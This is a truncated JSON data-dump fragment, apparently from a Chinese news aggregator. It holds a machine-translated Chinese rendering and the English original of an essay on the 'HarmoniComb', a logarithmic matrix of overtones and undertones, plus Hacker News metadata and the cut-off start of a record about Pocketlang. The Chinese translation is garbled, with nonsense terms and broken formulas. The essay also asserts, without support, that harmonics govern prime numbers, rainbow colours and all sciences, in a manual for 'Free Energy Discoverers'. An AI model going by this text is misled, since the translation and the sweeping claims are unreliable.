\u4f8b\u5982\uff0c\u7b2c\u4e8c\u4e2a\u6cdb\u5b54\u00d72\u7684\u7b2c\u4e8c\u4ef6\u00f72\uff0c\u5728\u5b83\u4eec\u76f8\u4ea4\u7684\u786e\u5207\u70b9\u5904\u662f\u03c72\u548c\u00d72\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u7684\u7ed3\u679c\uff0c\u8fd9\u662f\u00f72\u00d72\uff08\u5176\u9690\u542b\u89e3\u91ca\u4e3a1\u2030\uff09 2\u00d72\uff09\u3002\u8fd9\u79cd\u7b80\u5355\u7684\u6570\u5b66\u4ee5\u76f8\u540c\u7684\u65b9\u5f0f\u4e0e\u6574\u4e2a\u513f\u7ae5\u7cfb\u5217\u7684\u00f72\u76f8\u540c\uff0c\u5c06\u5176\u503c\u4e58\u4ee5\u5347\u7ea7\u7cfb\u5217\u8c10\u6ce2\uff0c\u4e00\u4e2a\u63a5\u4e00\u4e2a\u3002\n    \u56e0\u6b64\uff0c\u5177\u6709\u57fa\u672c\u7684\uff08\u6216\u8c03\u8c10\u5230\uff09\u7684\u590d\u6742\u7684\u57fa\u8c03\u7b2c\u4e8c\u526f\u672c\u5c06\u8868\u73b0\u51fa\u81ea\u5df1\u7684\u5b8c\u6574\u7ed3\u6784\u7684overtones\uff0c\u5176\u4e2d\u5728\u8fd9\u91cc\u63cf\u7ed8\u4e86\u524d\u4e94\u4e2a\u3002\n  \u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u5982\u6b64\uff0c\u5e76\u8868\u793a\u6839\u636e\u526f\u8c10\u6ce2\u6a21\u578b\u8c03\u6574\u7684\u6bcf\u4e2a\u5176\u4ed6\u590d\u5408\u97f3\u7684\u81ea\u7136\u8c10\u6ce2\u6cdb\u97f3\u3002\n    \u56e0\u6b64\uff0c\u6211\u4eec\u5df2\u7ecf\u63cf\u7ed8\u4e86\u4e94\u79cd\u4e0d\u540c\u7684\u590d\u6742\u97f3\u8c03\uff0c\u5747\u5728\u81ea\u7136\u4e0b\u884c\u8c10\u6ce2\u7cfb\u5217\u7684\u57fa\u7840\u4e0a\u6709\u6240\u76f8\u5173\uff0c\u6bcf\u4e2a\u90fd\u5177\u6709\u81ea\u5df1\u7684\u4e00\u7cfb\u5217\u4e0a\u5347\u8c10\u6ce2\u3002 \n\u5b83\u4eec\u5728\u540c\u4e00\u56fe\u5f62\u4e0a\u663e\u793a\u7684\u4e8b\u5b9e\u540c\u65f6\u5e76\u4e0d\u4e00\u5b9a\u610f\u5473\u7740\u5b83\u4eec\u53ef\u4ee5\u4e00\u8d77\u64ad\u653e\uff08\u540c\u65f6\uff09\u3002\u76f8\u53cd\uff0c\u901a\u8fc7\u666e\u904d\u7684\u58f0\u5b66\u6cd5\u5f8b\uff0c\u8fd9\u4e9b\u8272\u8c03\u5e94\u8be5\u63a5\u4e00\u4e2a\u5730\uff08\u8fde\u7eed\uff09\u64ad\u653e\u3002\u5b83\u4eec\u5c06\u8fdb\u884c\u64ad\u653e\u7684\u987a\u5e8f\uff0c\u901a\u8fc7\u65f6\u95f4\uff0c\u5176\u5f3a\u5ea6\u548c\u6700\u91cd\u8981\u7684\uff0c\u6bcf\u4e2a\u590d\u5408\u97f3\u7684\u6ea2\u51fa\u91cf\u90fd\u4f1a\u53d1\u51fa\u58f0\u97f3\u4ee5\u53ca\u8fd9\u4e9b\u7684\u5f3a\u5ea6\uff0c\u6401\u57283 rd\u5343\u79a7\u97f3\u4e50\u5bb6\u624b\u4e2d\u3002\n    \u6bcf\u4e00\u4e2a\u6cdb\u97f3\u90fd\u4f1a\u663e\u793a\u6709\u81ea\u5df1\u7cfb\u5217\u7684\u5e95\u5c42\u7684\u53ef\u80fd\u6027\uff0c\u7ed3\u6784\u4e2d\u7684\u7ed3\u6784\u4e0e\u57fa\u672c\u7684\u7ed3\u6784\u76f8\u540c\uff0c\u4f46\u5728\u9891\u7387\u4e2d\u5b8c\u5168\u8f6c\u79fb\u3002\u4f5c\u4e3a\u7b2c\u4e00\u793a\u4f8b\uff0c\u4e0b\u9762\u63cf\u7ed8\u4e86\u590d\u5408\u97f3\uff08\u5177\u6709\u57fa\u672c1\uff09\u7684\u590d\u5408\u97f3\uff08\u5177\u6709\u57fa\u672c1\uff09\u7684\u7b2c\u4e8c\u6cdb\u97f3\uff0c\u5982\u4e0b\u6240\u793a\u3002\n    \u8be5\u513f\u7ae5\u7cfb\u5217\u7684\u6bcf\u4e2a\u65b0\u6210\u5458\u7684\u6570\u503c\u7531\u8be5\u7cfb\u5217\u57fa\u7840\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u7ed9\u51fa\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f\u7b2c\u4e8c\u4e2a\u6cdb\u97f3\u548c\u539f\u59cb\u6388\u6743\u7cfb\u5217\u3002\u56fe\u4e2d\u7684\u6bcf\u4e00\u4e2a\u65b0\u523b\u5ea6\u5b9e\u9645\u4e0a\u90fd\u662f\u7531\u5e73\u884c\u6269\u5c55\u548c\u6295\u5f71\u7684\u8ddf\u8e2a\u4ea7\u751f\u7684\u4ea4\u53c9\u70b9\u3002\u6bcf\u4e2a\u65b0\u503c\u90fd\u5c06\u5305\u542b\u4e0e\u5176\u5404\u81ea\u7684\u8fd0\u7b97\u7b26\u5171\u540c\u521b\u5efa\u5b83\u7684\u6570\u5b57\u3002\n  \u4f8b\u5982\uff0c\u7b2c\u4e8c\u6cdb\u5b54\u00d72\u7684\u7b2c\u4e8c\u4e2a\u4f2aundert 2\uff0c\u5728\u5b83\u4eec\u76f8\u4ea4\u7684\u786e\u5207\u70b9\u5904\u662f\u00d72\u548c\u03c72\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u7684\u7ed3\u679c\uff0c\u5373\u00d72\u00f72\uff08\u6697\u793a\u89e3\u91ca\u4e3a1\u00d7 2\u00bc2\uff09\u3002\u8fd9\u79cd\u7b80\u5355\u7684\u6570\u5b66\u4ee5\u4e0e\u6574\u4e2a\u513f\u7ae5\u7cfb\u5217\u7684\u00d72\u76f8\u540c\u7684\u65b9\u5f0f\u7ee7\u7eed\uff0c\u5c06\u5176\u503c\u9664\u4ee5\u8c10\u6ce2\u7684\u4e0b\u964d\u7cfb\u5217\uff0c\u4e00\u4e2a\u9010\u4e2a\u3002\n    \u56e0\u6b64\uff0c\u7b2c\u4e8c\u4e2a\u6cdb\u97f3\uff0c\u5373\u53e6\u4e00\u79cd\u590d\u6742\u7684\u57fa\u8c03\u7684\u4e00\u90e8\u5206\uff0c\u5c06\u5c55\u793a\u5176\u81ea\u8eab\u7684\u5e95\u90e8\u7ed3\u6784\u7ed3\u6784\uff0c\u5176\u4e2d\u4ec5\u5728\u8fd9\u91cc\u63cf\u7ed8\u4e86\u524d\u4e94\u4e2a\u3002\n  \u4ee5\u8fd9\u79cd\u65b9\u5f0f\u7ee7\u7eed\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee3\u8868\u6240\u6709\u5176\u4ed6\u5173\u4e8e\u4e3b\u8981\u590d\u5408\u97f3\u8c03\u7684\u8c10\u6ce2\u7684\u81ea\u7136\u8c10\u6ce2\u672f\u8bed\u3002\n    \u56e0\u6b64\uff0c\u6211\u4eec\u5df2\u7ecf\u63cf\u7ed8\u4e86\u4e94\u79cd\u4e0d\u540c\u7684\u590d\u5408\u97f3\uff08\u5305\u62ec\u57fa\u7840\uff09\u7684\u4e0d\u540c\u8c10\u6ce2\u6cdb\u97f3\uff0c\u6bcf\u4e2a\u8c10\u6ce2\u90fd\u6709\u81ea\u5df1\u7684\u4e00\u7cfb\u5217\u4e0b\u964d\u8c10\u6ce2\u3002 \n\u5982\u679c\u4e24\u4e2a\u6784\u9020\u91cd\u53e0\uff0c\u5219\u6240\u6709\u4ea4\u53c9\u70b9\u90fd\u91cd\u53e0\uff0c\u5b83\u4eec\u7684\u503c\u5bf9\u5e94\u3002\u4ed6\u4eec\u5f7c\u6b64\u6ca1\u6709\u4ec0\u4e48\u4e0d\u540c;\u5b83\u4eec\u7684\u503c\u91cd\u5408\uff0c\u56e0\u4e3a - \u4f8b\u5982\uff1a\uff081\uff09\u00f72\u00d73 =\uff081\uff09\u00d73\u00f72\u3002\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u7ed9\u51fa\u76f8\u540c\u7684\u7ed3\u679c\uff0c\u4ee5\u4e24\u79cd\u7c7b\u4f3c\u7684\u65b9\u5f0f\u5230\u8fbe\u3002\u6bcf\u4e2a\u97f3\u4e50\u5b9e\u4f53\u7684\u8fd9\u79cd\u53cc\u91cd\u751f\u6210\u5c06\u5728\u540e\u9762\u8fdb\u4e00\u6b65\u8ba8\u8bba\u3002\n      \u5bf9\u4e8eHasmonicomb\u77e9\u9635\u5185\u7684\u503c\uff08\u7531\u5916\u8fb9\u7f18\u7684\u76f8\u4e92\u4f5c\u7528\u4ea7\u751f\uff09\uff0c\u5373\u4f7f\u6211\u4eec\u5199\u201c\u00f72\u00d73\u201d\uff0c\u201c\u00d73\u00f72\u201d\u7b49\uff0c\u9690\u542b\u7684\u89e3\u91ca\u662f\u201c1\u00f72\u00d7 3\u201c\uff0c\u201d1\u00d73\u00f72\u201c\u7b49\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u4e24\u4e2a\u8868\u8fbe\u5f0f\u76f8\u7b49\uff0c\u53ef\u4ee5\u4ee5\u7b80\u5355\u7684\u5f62\u5f0f\u5199\u5165\u4e00\u4e2a\u5206\u6570\uff1a\n  1\u00f72\u00d73 = 1\u00d73\u00bc2= 2  -  3\n    1\u00f7b\u00d7c = 1\u00d7c\u00f7b = b  -  c\n  \u6bd4\u7387\u662f\u4ee3\u8868\u97f3\u4e50\u5b9e\u4f53\uff08\u58f0\u97f3\u8ddd\u79bb\uff09\u7684\u6700\u4f73\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6bcf\u79cd\u4e50\u6807\u5199\u5165\u4e24\u4e2a\u6574\u6570\uff08Rational\uff09\u6570\u5b57\u7684\u4e00\u90e8\u5206\uff0c\u5177\u6709\u81f3\u5c11\u4e94\u79cd\u4e0d\u540c\u548c\u975e\u72ec\u5bb6\u6db5\u4e49\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u6bcf\u4e2a\u5206\u6570\u90fd\u53ef\u4ee5\u4ee5\u4e94\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u89e3\u91ca\uff0c\u8fd9\u4e9b\u89e3\u91ca\u4e0d\u4f1a\u4e92\u76f8\u62b5\u6d88\u3002\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u6db5\u76d6\u4e86\u5176\u4e2d\u4e00\u4e2a\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5b8c\u6210\u3002\n    \u5728\u4e0b\u4e00\u7ae0\u4e2d\u5c06\u8ba8\u8bba\u539f\u59cb\u8c10\u6ce2\u7cfb\u5217\uff08\u5728\u53f3\u4fa7\u548c\u5e95\u90e8\u5916\u8fb9\u7f18\uff09\u4e0a\u65b9\u548c\u4e0b\u65b9\u7684\u53f3\u4e0b\u548c\u5e95\u90e8\u5916\u8fb9\u7f18\uff09\u7684\u7279\u6b8a\u60c5\u51b5\u3002\n  \u6ce8\u610f\u5982\u4f55\u6c34\u5e73\uff0c\u5206\u6570\u68d2\uff08\u5206\u5b50\uff09\u4e0a\u65b9\u7684\u6240\u6709\u6570\u5b57\u90fd\u662f\u76f8\u540c\u7684 - \u8fd9\u4e9b\u90fd\u662f\u5148\u524d\u6807\u6709\u201c\u00d7\u201d\u7684\u4e0a\u5347\u8c10\u6ce2;\u5782\u76f4\u5730\uff0c\u5206\u6570\u6761\uff08\u5206\u6bcd\uff09\u4ee5\u4e0b\u7684\u6240\u6709\u6570\u5b57\u5177\u6709\u76f8\u540c\u7684\u503c - \u8fd9\u4e9b\u662f\u5148\u524d\u6807\u6709\u201c\u00f7\u201d\u7684\u4e0b\u884c\u8c10\u6ce2\u3002\u56e0\u6b64\uff0c\u5982\u679c\u907f\u5f00\u4e86\u8fd9\u79cd\u80cc\u666f\uff0c\u53ea\u9700\u901a\u8fc7\u67e5\u770b\u6bd4\u7387\uff08\u6216\u6bd4\u7387\u96c6\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u5373\u5224\u65ad\u5b83\u4eec\u662f\u5982\u4f55\u751f\u6210\u7684\uff0c\u5e76\u4e14\u5b83\u4eec\u5c5e\u4e8e\u56fe\u5f62\u7684\u4f4d\u7f6e\u3002 \n\u4e0b\u9762\u63cf\u7ed8\u7684\u662f1024\u6b21\u8c10\u6ce2\u7684\u8c10\u6ce2\u77e9\u9635\uff0c\u5728\u4e24\u4e2a\u65b9\u5411\u4e0a\u5ef6\u4f38\u5e76\u5f7c\u6b64\u76f8\u4e92\u4f5c\u7528\u3002\u5728\u5b8c\u6574\u6027\uff0c\u5b83\u5f88\u5c11\u4f7f\u7528\u97f3\u4e50 - \u7279\u522b\u662f\u56e0\u4e3a\u5b83\u7684\u8bb8\u591a\u7403\u573a\u843d\u5728\u4eba\u7c7b\u542c\u529b\u8303\u56f4\u4e4b\u5916\u3002\u4f46\u5b83\u7684\u4efb\u4f55\u90e8\u5206\u90fd\u53ef\u4ee5\u51c6\u786e\u5730\u4ee3\u8868\u4e0d\u540c\u7684\u8c03\u8c10\u7cfb\u7edf\uff0c\u56e0\u4e3a\u6211\u4eec\u5c06\u5728\u4ee5\u4e0b\u7ae0\u8282\u4e2d\u770b\u5230\u3002\n    \u8be5\u56fe\u4e0a\u7684\u6bcf\u4e2a\u4ea4\u53c9\u70b9\u90fd\u662f\u8868\u793a\u7b80\u5355\u97f3\u8c03\u7684\u9891\u7387\u7684\u6bd4\u7387\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u4ece\u4e0b\u964d\u9636\u5c42\u9009\u62e9\u8c03\u8c10\uff08\u62bd\u8c61\u7684\u58f0\u97f3\uff09\u548c\u901a\u8fc7\u6784\u9020\u6b64\u8c03\u8c10\u7684\u590d\u5408\u8272\u8c03\u6765\u5236\u9020\u97f3\u4e50\u5347\u5e8f\u7cfb\u5217\u3002\u58f0\u97f3\u590d\u5408\u97f3\u662f\u5f26\u7684\u5b9a\u4e49\u3002\n  \u7136\u800c\uff0c\u5982\u679c\u6bcf\u79cd\u6bd4\u4f8b\u4ee3\u8868\u590d\u5408\u97f3\u7684\u57fa\u7840\uff0c\u5219\u8fc4\u4eca\u63cf\u8ff0\u7684\u539f\u5219\u4ecd\u7136\u9002\u7528\uff0c\u5e76\u4e14\u5fc5\u987b\u5c06\u7b2c\u4e09\u7ef4\u5ea6\u6dfb\u52a0\u5230Harmonicomb\u4e2d\uff0c\u4ee5\u4fbf\u6b63\u786e\u63cf\u8ff0\u3002\u4f7f\u7528\u6b64\u7cfb\u7edf\u7684\u4efb\u4f55\u97f3\u4e50\u5c06\u662f\u548c\u8c10\u7684\uff0c\u5982lon\n...... ", "note_en": "The visual representation described in this paper is the result of my own research and work, but does not constitute a novelty in its entirety. The basis, or underlying principle of this mathematical graph is a matrix of numbers with ancient history  1 called \u201cLambdoma\u201d, also known as the Lambdoid by Nicomachus, the Pythagorean ChiX, the Tetraktys by Plato, the Lambdoma Table by von Thimus, and the Cantor array.  2 Other names include Mensa Pythagorica  3 and combinations of the above terms, like Pythagorean Table. Whole-number systems that bear a one-to-one relationship with the Lambdoma matrix are the Farey series of gear ratios generated by a Diophantine equation  4 ;  5 and the Stern\u2013Brocot tree. Related concepts include the Archetypal Splay\u2013Tree or Co\u2013Prime Pattern  6 mapped by Ervin M. Wilson inside this grid of harmonic ratios, and the Partch\u2013Meyer\u2013Novaro tonality diamond structures which constitute a confined development of the original concept.\n  The novelty of my version consists in the accurate representation of musical entities, by using a graphical system mathematicians call \u201clogarithmic\u201d, which I call \u201csonic\u201d, where the eye sees the distribution of tone-spaces in the same way as the ear hears them.\n  After finishing research, while working on the presentation of the construct I came to call \u201cHarmoniComb\u201d (short for \u201cMatrix of Harmonic Combinations\u201d), which could also be called \u201cLogarithmic Pythagorean Lambdoma\u201d, I found in a book called \u201cTextbook of Harmonics\u201d a presentation of the same concept, studied as a peculiar application of logarithmic measurement to the linear Lambdoma matrix of musical ratios. Its author, Hans Kayser, writes:\n  \u00abIn contrast with the equidistant coordinate system used previously, we use a logarithmic system here, i.e. one that diminishes perspectively in its ratios from the middle outwards. We use a diagrammatic inventory of the tone-values, meaning that the tones, in a certain sense, look the way they sound (not the way we measure or count them).\u00bb  7\n  Although Kayser\u2019s work contains a two-dimensional logarithmic construct and a three-dimensional linear one, he never joined them into a three-dimensional logarithmic matrix \u2013 at least as far as I know. He also never looked at the ascending\u2014descending reciprocals from the temporal perspective of tempo or rhythm, his work remaining confined to the tonal realm of pitch. Nevertheless, he took the study of harmonics to extreme, and wrote a lifetime\u2019s worth of books on the subject.  8\n  As it turned out, at least one person before me has independently discovered a part of the same (harmonics\u2013related) basic concepts, and this confirmed and reinforced my own work. A work based on the fact that visual perception is the most absorbed method of understanding, and maybe the only proper way to learn about the unseen, formless world of sound\u2013relations.\n  This paper is part of the \u201cWhat Music Really \u0130s:  The Manual for The 3 rd Millennium Musician,  Spiritual Seeker and Free  Energy Discoverer\u201d. The information presented here, although in a very simple and intuitive manner, might be of little value to the innocent music lover when taken out of its original context. That\u2019s why in continuing, it is assumed that the reader has knowledge about the true harmonic series in its completeness: what it really is, where it can be found in nature and how different harmonics can be isolated and emphasized on instruments that allow it; also that the reader is well acquainted with  \u201cThe Math Behind Music\u201d.\n  Whenever the term \u201charmonic series\u201d will be used herein, it implies both the ascending and descending series, unless otherwise stated. Whenever the term \u201charmonics\u201d is used, it implies both supra-harmonics (overtones or harmonics from the ascending series) and sub-harmonics (undertones or harmonics from the descending series), unless otherwise stated. These are  simple tones: manifestations of sound in their purest form, exactly as they appear in nature inside complex tones, and their use throughout this work is implied in the precise numerical form given. The use of temperament or other artificial contrivances and approximations is totally excluded.\n  All the ratios presented here refer to simple sound tones. It will be shown that complex tones are generated from these simple tones, as depicted in the conceptual matrix presented further down. By extension, these harmonics can be used as template for practical tuning systems applied to compound tones. In this case, it is only their fundamental which is taken into account in computation, while their respective harmonic series is implied as being related to the fundamental in whole (rational, integer) number relations.\n    Musically, the harmonic series is nature\u2019s single perfect tuning system and rhythmic pattern. Most of the cultural tunings and rhythms currently employed over the world were developed according to arbitrary social constructs and are part of the subjective experience of musico-social conditioning. Many are based on the true harmonic series and represent a distant slice of it with irregularly missing members. Others, like temperaments, are totally artificial despite any attempt to make them seem as extensions of natural harmonics. Excluding equal and unequal temperaments, any other conceivable tunings based on rational numbers (and their combinations in form of fractions) can be traced back to a pattern inside the matrix presented here.\n  Mathematically, the harmonic series is the formula for nature\u2019s laws of relationships. These laws are not reflected only in music, as harmonic genesis of timbre, rhythms and pitches, as sonic distances between harmonics, frequency relations between tones, and size proportions of bodies generating sound, but also in  all numbers and number systems in use, as the  pattern of true prime numbers, inherent in the  geometry of architecture and visual art, at  the core of trigonometry, in  the colors of the rainbow, and generally in all arts and sciences.\n    The ascending harmonic series is graphed vertically on the \u201cwhat-you-see-is-how-you-hear\u201d sonic number line of frequency perception, to convey the resolution of this series unto itself. This simply means that all overtone components fit perfectly within the fundamental, and also with each other \u2013 as long as the same fundamental remains their common reference.\n    The sonic number line depicts differences in pitch exactly as they are perceived and interpreted by the human brain. The numbers represent frequency multipliers, as related to the absolute fundamental (the second supra-harmonic \u00d72 has a frequency 2 times higher than the fundamental 1; supra-harmonic \u00d73 sounds 3 times higher than 1, and so on). The outlines of oscillating strings represent actual physical dimensions of each harmonic\u2019s sound producing source.\n  The vertical arrangement also means that  any or all supra-harmonics can be played simultaneously (at the same time), the resulting sound being perceived by the ear as harmonically consonant. This is in fact  the definition of consonant harmony: simple tones whose frequencies are integer multiples of the fundamental, playing simultaneously with the fundamental.\n  This definition obeys one rule: any number of overtones are harmoniously consonant when played together, as long as the fundamental is also sounded with them. When the fundamental is not present, the further we ascend, the lower the perceived consonance. For example, sounding together supra-harmonics 2 and 3 will appear more pleasing to the sense of hearing than sounding together supra-harmonics 8 and 9. (But if we introduce the fundamental 1 into the picture, then 8 and 9 will resolve perfectly into it giving the sensation of consonant harmony.)\n  These supra-harmonics are simple tones. Playing them together creates a compound (or complex) tone, and  the specific volume (intensity or power) of each overtone in the mix accounts for timbre: that unique characteristic which makes a piano sound different from a sitar, when both instruments play a (compound) tone having the fundamental vibrating at the same frequency. This also accounts for the difference between two human voices pronouncing the same vowel, and the difference between different vowels chanted by the same person \u2013 all under the same condition: that their fundamentals have the same frequency.\n   Overtones could also be played consecutively, but let\u2019s leave that aside for later and stick with the basics for now.\n    The descending harmonic series is graphed horizontally on the \u201cwhat-you-see-is-how-you-hear\u201d sonic number line of frequency perception, to convey the fact that the fundamental fits perfectly within all undertone components (which in turn don\u2019t always fit with each other).\n    The sonic number line depicts differences in pitch exactly as they are perceived and interpreted by the human brain. The numbers represent frequency divisors, as related to the absolute fundamental (the second sub-harmonic \u00f72 has a frequency 2 times lower than the fundamental 1; sub-harmonic \u00f73 sounds 3 times deeper than 1, and so on). The outlines of oscillating strings represent actual physical dimensions of each harmonic\u2019s sound producing source. The amplitude (power, volume) of these is not properly depicted.\n  The horizontal arrangement also means that  any or all sub-harmonics can be played consecutively (one after another), the resulting melody being perceived by the sense of hearing as musically valid. If however more than two are played simultaneously, the resulting compound sound will be perceived as harmonically dissonant. This is in fact  the definition of dissonant harmony: simple tones whose frequencies are integer sub-multiples of the fundamental, playing simultaneously with the fundamental.\n  As a side note, non-harmonic dissonance or out-of-tune-ness is created by the simultaneous sounding of complex tones that are not in tune with themselves. This simply means that any number of complex tones whose fundamental frequencies do not exhibit relationships taken directly from their own harmonic series will sound out-of-tune when played together. That\u2019s because their fundamentals and complete harmonic series will combine into non-repeating patterns: non-harmonic movement that does not repeat the same cycle in exactly the same time. Physically, this translates into outlines of oscillating strings that do not fit perfectly into each other.\n  The simplest frequency-relationships (ratios) account for purest consonances. With other words, harmonic relations of very large numbers tend towards higher states of harmonic dissonance, while unmusical, seemingly unresolvable and out-of-tune dissonances are generated by unmusical numbers having non-recurring and never-ending decimals (irrational numbers). There is of course a questionable degree of dissonance that can be tolerated, but the most obvious fact is that the brain can well be conditioned to accept and even enjoy these dissonances, as long as they are part of the only music it has ever experienced.\n  The use of undertones could be extended to simultaneous playing, but this is part of an ampler talk about expanded musical possibilities which currently doesn\u2019t serves us in laying out the foundations.\n    The vertical and horizontal tonal aspects of music being defined (through simultaneous and consecutive sounding of tones), we can proceed by extending the two reciprocal harmonic series from the same fundamental.\n    Although extending much higher in reality, and into infinity conceptually, only the first 5 harmonics have been depicted here, for the purpose of clarity. The associated colors are arbitrary.\n  It can be seen from the picture that the fundamental, marked  1, has a series of harmonic overtones rising higher and higher in pitch, progressing vertically from the bottom up, and the intervals between these get smaller and smaller as pitch increases. This is in fact a conceptual representation of a compound tone, which sounds the fundamental and all vertical harmonics simultaneously (in a chord, if you will). Volume or intensity is not depicted on this graph.\n  The undertone series of harmonics displays an exact opposite and symmetrical structure. As the series decreases in pitch, progressing horizontally from right to left, the intervals get smaller and smaller. The difference is, this series does not represent the structure of a compound tone, but rather the steps to be melodically taken by such tones. This literally means that every undertone will have its own series of overtones.\n  So what does this  actually mean? It means that frequency grows or diminishes (exponentially), multiplying or dividing its value by the number after the operator (\u00d7 or \u00f7 signs), and is always related to the fundamental of the series. Say this fundamental   1 gets assigned to a frequency of   300 events per unit of time; that would make the  \u00d72 overtone vibrate  600 times, the  \u00d73 overtone  900 times and so on, while the frequency of the  \u00f72 undertone will be  150 events per unit of time, that of the  \u00f73 undertone  100, and so on.\n  That\u2019s why,  for the values on the outer edges, even though we write \u201c \u00d75\u201d, \u201c \u00f73\u201d, etc., the implied interpretation is \u201c 1 \u00d75\u201d, \u201c 1 \u00f73\u201d, etc.\n    Every undertone will have its own series of overtones, identical in structure with that of the fundamental, but shifted altogether in frequency. Taking as example the second undertone, a compound tone tuned to this frequency will have its own shifted series of overtones as depicted below.\n    The numerical values of every new member of this child-series are given by the interaction between the fundamental of the series, which in this case is the second undertone, and the original overtone series. Every new tick on the graph is in fact an intersection point resulted from a parallel extension and the tracing of projections. Every new value will contain the numbers that intersected to create it, together with their respective operators.\n  For example, the second overtone  \u00d72 of the second undertone  \u00f72, at the exact point where they intersect, is the result of the interaction between  \u00f72 and  \u00d72, which is  \u00f72  \u00d72 (and whose implied interpretation is   1  \u00f72  \u00d72). This simple math continues in the same manner for the entire child-series of  \u00f72, multiplying its value by those of the ascending series of harmonics, one by one.\n    Thus a complex tone having as fundamental (or which is tuned to) the second undertone will exhibit its own complete structure of overtones, of which just the first five are depicted here.\n  We can continue like this and represent the natural harmonic overtones of every other compound tone tuned according to the sub-harmonic model.\n    Thus we have depicted five different compound tones, all related on the basis of the natural descending harmonic series, each having its own series of ascending harmonics.\n  The fact that they are all shown on the same graphic at the same time doesn\u2019t necessarily mean they can be played together (simultaneously). On the contrary, by the universal laws of acoustics, these tones should be played one after another (consecutively). The order in which they are to be played, the length of each tone through time, its intensity, and most important, the amount of overtones each compound tone will sound and the intensities of these, rests in the hands of the 3 rd Millennium Musician.\n    Every overtone will display the possibility of having its own series of undertones, identical in structure with that of the fundamental, but shifted altogether in frequency. As a first example, the second overtone of a compound tone (having the fundamental   1), together with its own series of shifted undertones, is depicted below.\n    The numerical values of every new member of this child-series are given by the interaction between the fundamental of the series, which in this case is the second overtone, and the original undertone series. Every new tick on the graph is in fact an intersection point resulted from a parallel extension and the tracing of projections. Every new value will contain the numbers that intersected to create it, together with their respective operators.\n  For example, the second undertone  \u00f72 of the second overtone  \u00d72, at the exact point where they intersect, is the result of the interaction between  \u00d72 and  \u00f72, which is  \u00d72  \u00f72 (and whose implied interpretation is   1  \u00d72  \u00f72). This simple math continues in the same manner for the entire child-series of  \u00d72, dividing its value by those of the descending series of harmonics, one by one.\n    Thus the second overtone, which is part of another complex tone, will exhibit its own complete structure of undertones, of which just the first five are depicted here.\n  Continuing in this manner we can represent the natural harmonic undertone series of every other supra-harmonic of the main compound tone.\n    We have thus depicted five different harmonic overtones of a single compound tone (fundamental included), each having its own series of descending harmonics.\n    If the two constructs get overlapped, all intersection points overlap and their values correspond. They are no different from each other; their values coincide because \u2013 for example: (  1)  \u00f72  \u00d73 = (  1)  \u00d73  \u00f72. The two operations are the exact same thing, giving the same result, arrived at in two similar ways. This dual genesis of every musical entity will be further discussed later on.\n      For the values inside the HarmoniComb matrix (generated by the interaction between those on the outer edges), even though we write \u201c \u00f72  \u00d73\u201d, \u201c \u00d73  \u00f72\u201d, etc., the implied interpretation is \u201c 1  \u00f72  \u00d73\u201d, \u201c 1  \u00d73  \u00f72\u201d, etc. In this example, the two expressions are equal and can be written in simple form as one fraction:\n  1 \u00f7  2 \u00d7  3 =  1 \u00d7  3 \u00f7  2 =      2 \u2013 3\n    1 \u00f7  b \u00d7  c =  1 \u00d7  c \u00f7  b =      b \u2013 c\n  Ratios are the best way of representing musical entities (sonic distances) because every musical ratio, written as a fraction of two integer (rational) numbers, has at least five different and non-exclusive meanings. With other words, every fraction can be interpreted in five different ways, and these interpretations do not cancel each other. So far we covered one of them, and we\u2019re not quite finished.\n    The special case of the original harmonic series (on the right and bottom outer edges) which have the number \u201c1\u201d above and below the fraction bar will be discussed in the next chapter.\n  Notice how horizontally, all numbers above the fraction bars (numerators) are the same \u2013 these are all ascending harmonics previously marked with \u201c\u00d7\u201d; vertically, all numbers below the fraction bars (denominators) have the same value \u2013 these are all descending harmonics previously marked with \u201c\u00f7\u201d. Therefore,  if taken out of this context, just by looking at a ratio (or set of ratios) we can instantly tell how they were generated and where they belong on the graphic.\n  Depicted below is a HarmoniComb Matrix of 1024 harmonics extending in both directions and interacting with each other. In its completeness, it is of little use musically \u2013 especially since many of its pitches fall outside the human hearing range. But any part of it can accurately represent different tuning systems, as we shall see in the following chapters.\n    Every intersection point on this diagram is a ratio that represents the frequency of a simple tone, and music can be made out of it by choosing a tuning (abstract scale of sounds) from the descending series and by constructing the compound tones of this tuning from the ascending series. Sounding a compound tone is the definition of a chord.\n  If however every ratio is taken to represent the fundamental of a compound tone, the principles described hitherto still apply and a third dimension would have to be added to the HarmoniComb in order to properly depict that. Any music using this system will be harmonically consonant, as lon\n......", "posttime": "2021-06-22 15:51:53", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u827a\u672f,\u8c10\u6ce2,art", "title": "\u7ed3\u5408\u8c10\u6ce2\u7684\u7f8e\u672f\u827a\u672f ", "title_en": "The Fine Art of Combining Harmonics", "transed": 1, "url": "https://whatmusicreallyis.com/research/harmonicomb/", "via": "", "real_tags": ["\u827a\u672f", "\u8c10\u6ce2", "art"]}, {"category": "", "categoryclass": "", "imagename": "1180f6f4a93b45fdb2447b1dab6ddc8f.png", "infoid": 1067383, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Pocketlang\u662f\u4e00\u79cd\u5c0f\uff08\u301c3000\u5206\u7126\u5347\uff09\u548c\u7528\u5728C.\uff06\uff0339; s\u8bed\u6cd5\u7c7b\u4f3c\u4e8eRuby\u548c\u5b83\u624d\u80fd\u572815\u5206\u949f\u5185\u5b66\u5230\u7684\u5c0f\u5de7\u7684\u8bed\u8a00\u3002\u5305\u62ec\u7f16\u8bd1\u5668\uff0c\u5b57\u8282\u7801VM\u548c\u8fd0\u884c\u65f6\uff0c\u5b83\uff06\uff0339; 